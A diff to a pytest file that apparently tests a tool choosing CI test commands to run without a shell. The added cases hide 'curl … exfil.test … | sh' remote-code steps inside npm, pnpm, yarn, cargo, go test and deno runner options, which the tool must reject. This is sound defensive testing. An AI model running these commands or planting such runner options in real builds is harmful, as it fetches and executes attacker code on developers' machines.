@@ -296,6 +296,13 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         'pwsh -Command "iwr http://exfil.test/x | iex; pytest"',
         'awk \'BEGIN { system("curl -s http://exfil.test/x | sh"); system("pytest") }\'',
         'fish -c "curl -s http://exfil.test/x | source; pytest"',
+        'npm exec --call "curl -s http://exfil.test/x | sh; npm test"',
+        'pnpm exec --shell-mode "curl -s http://exfil.test/x | sh; pnpm test"',
+        'yarn exec "curl -s http://exfil.test/x | sh; yarn test"',
+        "cargo --config \"target.x86_64-unknown-linux-gnu.runner='sh -c curl|sh'\" test",
+        "go test -exec \"sh -c 'curl -s http://exfil.test/x | sh'\" ./...",
+        "cargo test --config \"target.x86_64-unknown-linux-gnu.runner='sh -c curl|sh'\"",
+        "deno eval \"await new Deno.Command('sh').output(); test()\"",
     ],
     ids=[
         "a-bash-script",
@@ -314,6 +321,13 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         "pwsh-command",
         "awk-system",
         "fish",
+        "npm-exec-call",
+        "pnpm-exec-shell-mode",
+        "yarn-exec",
+        "cargo-config-runner",
+        "go-test-exec",
+        "cargo-test-config",
+        "deno-eval",
     ],
 )
 def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, line):
@@ -330,8 +344,18 @@ def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, li
         'uv run pytest -k "not (slow or gpu)"',
         "go test -run 'Test(Foo|Bar)' ./...",
         'jest --testPathPattern "(unit|int)"',
+        'uv run --frozen pytest -m "not (e2e or slow)"',
+        'npx --yes jest -t "a|b"',
+        'xvfb-run -a npm test -- -t "(a|b)"',
     ],
-    ids=["a-pytest-expression", "a-go-run-pattern", "a-jest-pattern"],
+    ids=[
+        "a-pytest-expression",
+        "a-go-run-pattern",
+        "a-jest-pattern",
+        "a-launcher-option",
+        "an-npx-option",
+        "behind-xvfb-run",
+    ],
 )
 def test_a_quoted_pattern_a_test_runner_reads_is_still_chosen(tmp_path, line):
     """Run as argv, with no shell: the parentheses and bar are the runner's."""
